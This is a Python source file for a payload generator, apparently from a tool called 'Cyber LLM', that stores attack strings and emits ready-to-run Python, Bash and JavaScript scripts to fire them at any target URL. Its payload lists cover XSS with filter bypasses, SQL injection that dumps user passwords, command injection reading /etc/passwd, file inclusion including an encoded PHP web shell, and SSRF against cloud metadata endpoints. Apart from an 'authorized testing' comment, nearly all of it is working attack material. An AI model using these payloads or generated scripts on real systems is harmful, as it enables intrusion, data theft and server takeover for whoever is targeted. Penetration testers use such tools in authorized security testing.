"""
Payload generator for security testing.
"""

import logging
from typing import Dict, List, Any
import base64
import urllib.parse

logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Security testing payload generator."""
    
    def __init__(self):
        self.payload_templates = self._initialize_payloads()
    
    def _initialize_payloads(self) -> Dict[str, Dict[str, Any]]:
        """Initialize payload templates."""
        return {
            "xss": {
                "description": "Cross-Site Scripting (XSS) payloads for web application testing",
                "payloads": {
                    "basic": [
                        "<script>alert('XSS')</script>",
                        "<img src=x onerror=alert('XSS')>",
                        "<svg onload=alert('XSS')>",
                        "javascript:alert('XSS')",
                        "'><script>alert('XSS')</script>"
                    ],
                    "event_handler": [
                        "<input onfocus=alert('XSS') autofocus>",
                        "<select onfocus=alert('XSS') autofocus>",
                        "<textarea onfocus=alert('XSS') autofocus>",
                        "<body onload=alert('XSS')>",
                        "<input onchange=alert('XSS')>"
                    ],
                    "filter_bypass": [
                        "<scr<script>ipt>alert('XSS')</script>",
                        "%3Cscript%3Ealert('XSS')%3C/script%3E",
                        "<script>alert(String.fromCharCode(88,83,83))</script>",
                        "<svg><script>alert&#40;'XSS'&#41;</script>",
                        "<iframe src=\"javascript:alert('XSS')\">"
                    ]
                }
            },
            "sql_injection": {
                "description": "SQL Injection payloads for database testing",
                "payloads": {
                    "basic": [
                        "' OR '1'='1",
                        "' OR 1=1--",
                        "admin'--",
                        "admin'/*",
                        "' OR '1'='1' /*"
                    ],
                    "union_based": [
                        "' UNION SELECT 1,2,3--",
                        "' UNION SELECT null,username,password FROM users--",
                        "' UNION SELECT 1,version(),database()--",
                        "' UNION SELECT 1,user(),@@version--",
                        "' UNION SELECT 1,table_name,column_name FROM information_schema.columns--"
                    ],
                    "boolean_based": [
                        "' AND 1=1--",
                        "' AND 1=2--",
                        "' AND (SELECT COUNT(*) FROM users)>0--",
                        "' AND LENGTH(database())>0--",
                        "' AND ASCII(SUBSTRING(database(),1,1))>64--"
                    ],
                    "time_based": [
                        "'; WAITFOR DELAY '00:00:05'--",
                        "' AND SLEEP(5)--",
                        "' OR pg_sleep(5)--",
                        "'; SELECT pg_sleep(5); --",
                        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
                    ]
                }
            },
            "command_injection": {
                "description": "Command injection payloads for system command testing",
                "payloads": {
                    "basic": [
                        "; ls",
                        "| ls",
                        "&& ls",
                        "|| ls",
                        "`ls`"
                    ],
                    "system_info": [
                        "; whoami",
                        "| id",
                        "&& uname -a",
                        "|| cat /etc/passwd",
                        "`cat /etc/hosts`"
                    ],
                    "encoded": [
                        "; $(echo bHM= | base64 -d)",
                        "| $(printf 'id')",
                        "&& $(echo -e '\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')",
                        "|| $(python -c 'import os; os.system(\"ls\")')"
                    ]
                }
            },
            "lfi": {
                "description": "Local File Inclusion payloads for file access testing",
                "payloads": {
                    "basic": [
                        "../../../etc/passwd",
                        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                        "....//....//....//etc/passwd",
                        "..%2f..%2f..%2fetc%2fpasswd",
                        "....\\\\....\\\\....\\\\etc\\\\passwd"
                    ],
                    "null_byte": [
                        "../../../etc/passwd%00",
                        "../../../etc/passwd%00.jpg",
                        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00.txt"
                    ],
                    "php_wrappers": [
                        "php://filter/convert.base64-encode/resource=../../../etc/passwd",
                        "php://input",
                        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=",
                        "expect://id",
                        "zip://shell.jpg%23shell.php"
                    ]
                }
            },
            "ssrf": {
                "description": "Server-Side Request Forgery payloads for internal access testing",
                "payloads": {
                    "localhost": [
                        "http://localhost:80",
                        "http://127.0.0.1:80",
                        "http://0.0.0.0:80",
                        "http://[::1]:80",
                        "http://169.254.169.254/latest/meta-data/"
                    ],
                    "bypass": [
                        "http://0x7f000001:80",
                        "http://2130706433:80",
                        "http://127.1:80",
                        "http://localhost.evil.com",
                        "http://evil.com@127.0.0.1"
                    ],
                    "cloud_metadata": [
                        "http://169.254.169.254/latest/meta-data/",
                        "http://169.254.169.254/v1/metadata/",
                        "http://metadata.google.internal/computeMetadata/v1/",
                        "http://169.254.169.254/metadata/v1/"
                    ]
                }
            }
        }
    
    def generate(self, payload_type: str, language: str = "raw", category: str = "basic") -> str:
        """Generate payload of specified type."""
        try:
            if payload_type not in self.payload_templates:
                available_types = list(self.payload_templates.keys())
                return f"Unknown payload type. Available types: {', '.join(available_types)}"
            
            payload_data = self.payload_templates[payload_type]
            payloads = payload_data["payloads"].get(category, payload_data["payloads"]["basic"])
            
            if language == "python":
                return self._generate_python_payload(payload_type, payloads)
            elif language == "bash":
                return self._generate_bash_payload(payload_type, payloads)
            elif language == "javascript":
                return self._generate_javascript_payload(payload_type, payloads)
            else:
                # Return raw payloads
                return "\n".join(payloads)
                
        except Exception as e:
            logger.error(f"Payload generation error: {e}")
            return f"Error generating payload: {str(e)}"
    
    def _generate_python_payload(self, payload_type: str, payloads: List[str]) -> str:
        """Generate Python script with payloads."""
        script = f"""#!/usr/bin/env python3
# {payload_type.upper()} Testing Payloads
# Generated by Cyber LLM - Use only for authorized testing

import requests
import urllib.parse

def test_{payload_type}(target_url, param_name):
    \"\"\"Test {payload_type} vulnerability.\"\"\"
    payloads = {payloads}
    
    print(f"Testing {{len(payloads)}} {payload_type} payloads against {{target_url}}")
    print("="*50)
    
    for i, payload in enumerate(payloads, 1):
        try:
            # URL encode the payload
            encoded_payload = urllib.parse.quote(payload)
            
            # Test GET request
            test_url = f"{{target_url}}?{{param_name}}={{encoded_payload}}"
            response = requests.get(test_url, timeout=10)
            
            print(f"Payload {{i}}: {{payload[:50]}}...")
            print(f"Status: {{response.status_code}}")
            print(f"Response Length: {{len(response.text)}}")
            
            # Check for potential vulnerabilities (basic detection)
            if _check_vulnerability_indicators(response, payload):
                print("⚠️  POTENTIAL VULNERABILITY DETECTED!")
            
            print("-" * 30)
            
        except requests.RequestException as e:
            print(f"Request error: {{e}}")
        except Exception as e:
            print(f"Error: {{e}}")

def _check_vulnerability_indicators(response, payload):
    \"\"\"Basic vulnerability detection.\"\"\"
    # This is a simplified check - enhance based on payload type
    return any(indicator in response.text.lower() for indicator in [
        "error", "exception", "warning", "mysql", "oracle", "postgresql"
    ])

if __name__ == "__main__":
    # Example usage - modify for your testing
    target = input("Enter target URL: ")
    param = input("Enter parameter name: ")
    test_{payload_type}(target, param)
"""
        return script
    
    def _generate_bash_payload(self, payload_type: str, payloads: List[str]) -> str:
        """Generate Bash script with payloads."""
        script = f"""#!/bin/bash
# {payload_type.upper()} Testing Script
# Generated by Cyber LLM - Use only for authorized testing

TARGET_URL="$1"
PARAM_NAME="$2"

if [ -z "$TARGET_URL" ] || [ -z "$PARAM_NAME" ]; then
    echo "Usage: $0 <target_url> <param_name>"
    exit 1
fi

echo "Testing {payload_type} payloads against $TARGET_URL"
echo "================================================"

# Payloads array
payloads=(
"""
        for payload in payloads:
            # Escape quotes and special characters for bash
            escaped_payload = payload.replace("'", "'\"'\"'").replace('"', '\\"')
            script += f'    "{escaped_payload}"\n'
        
        script += f""")

# Test each payload
for i in "${{!payloads[@]}}"; do
    payload="${{payloads[$i]}}"
    echo "Testing payload $((i+1)): ${{payload:0:50}}..."
    
    # URL encode payload (basic)
    encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
    
    # Make request
    test_url="${{TARGET_URL}}?${{PARAM_NAME}}=${{encoded_payload}}"
    response=$(curl -s -w "HTTPSTATUS:%{{http_code}}" "$test_url")
    
    # Extract status code
    status=$(echo "$response" | tr -d '\\n' | sed -e 's/.*HTTPSTATUS://')
    body=$(echo "$response" | sed -e 's/HTTPSTATUS:.*//g')
    
    echo "Status: $status"
    echo "Response length: ${{#body}}"
    echo "------------------------"
done

echo "Testing completed!"
"""
        return script
    
    def _generate_javascript_payload(self, payload_type: str, payloads: List[str]) -> str:
        """Generate JavaScript with payloads."""
        script = f"""// {payload_type.upper()} Testing Payloads
// Generated by Cyber LLM - Use only for authorized testing

const payloads = {payloads};

async function test{payload_type.title().replace('_', '')}(targetUrl, paramName) {{
    console.log(`Testing ${{payloads.length}} {payload_type} payloads against ${{targetUrl}}`);
    console.log('='.repeat(50));
    
    for (let i = 0; i < payloads.length; i++) {{
        const payload = payloads[i];
        
        try {{
            // URL encode the payload
            const encodedPayload = encodeURIComponent(payload);
            const testUrl = `${{targetUrl}}?${{paramName}}=${{encodedPayload}}`;
            
            console.log(`Payload ${{i + 1}}: ${{payload.substring(0, 50)}}...`);
            
            // Make request (Note: CORS restrictions may apply)
            const response = await fetch(testUrl, {{
                method: 'GET',
                mode: 'cors'
            }});
            
            console.log(`Status: ${{response.status}}`);
            
            const responseText = await response.text();
            console.log(`Response Length: ${{responseText.length}}`);
            
            // Basic vulnerability check
            if (checkVulnerabilityIndicators(responseText, payload)) {{
                console.log('⚠️  POTENTIAL VULNERABILITY DETECTED!');
            }}
            
            console.log('-'.repeat(30));
            
        }} catch (error) {{
            console.error(`Request error: ${{error.message}}`);
        }}
    }}
}}

function checkVulnerabilityIndicators(responseText, payload) {{
    const indicators = ['error', 'exception', 'warning', 'mysql', 'oracle', 'postgresql'];
    return indicators.some(indicator => 
        responseText.toLowerCase().includes(indicator)
    );
}}

// Example usage (uncomment to use):
// test{payload_type.title().replace('_', '')}('https://example.com/vulnerable-page', 'input');
"""
        return script
    
    def get_description(self, payload_type: str) -> str:
        """Get description of payload type."""
        if payload_type in self.payload_templates:
            return self.payload_templates[payload_type]["description"]
        return "Unknown payload type"
    
    def list_payload_types(self) -> List[str]:
        """List available payload types."""
        return list(self.payload_templates.keys())
    
    def list_categories(self, payload_type: str) -> List[str]:
        """List available categories for a payload type."""
        if payload_type in self.payload_templates:
            return list(self.payload_templates[payload_type]["payloads"].keys())
        return []
    
    def get_payload_count(self, payload_type: str, category: str = None) -> int:
        """Get count of payloads for type and category."""
        if payload_type not in self.payload_templates:
            return 0
        
        if category:
            payloads = self.payload_templates[payload_type]["payloads"].get(category, [])
            return len(payloads)
        else:
            total = 0
            for cat_payloads in self.payload_templates[payload_type]["payloads"].values():
                total += len(cat_payloads)
            return total